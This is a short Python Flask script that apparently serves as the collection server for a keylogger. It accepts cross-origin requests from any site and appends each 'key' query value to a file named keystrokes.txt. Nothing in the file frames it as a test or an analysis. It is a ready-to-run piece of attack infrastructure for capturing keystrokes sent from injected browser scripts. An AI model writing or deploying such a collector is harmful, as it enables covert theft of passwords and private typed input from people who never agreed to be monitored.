from flask import Flask
from flask import request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route("/")
def index():
  key = request.args.get("key")
  with open("keystrokes.txt", "a") as f:
    f.write(key + "\n")
  return "endpoint running fine :)"

app.run()
